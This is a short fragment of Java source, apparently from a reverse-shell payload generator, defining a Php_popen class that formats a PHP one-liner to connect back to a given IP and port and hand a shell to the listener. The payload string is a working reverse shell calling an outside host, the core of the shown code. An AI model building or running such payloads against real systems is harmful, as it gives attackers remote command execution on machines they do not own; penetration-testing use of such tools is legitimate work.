...
public class Php_popen extends Reverse {

    protected String shellFormat = "";

    public Php_popen(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("php -r '$sock=fsockopen(\\\"%s\\\",%s);popen(\\\"%s <&3 >&3 2>&3\\\", \\\"r\\\");'", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }
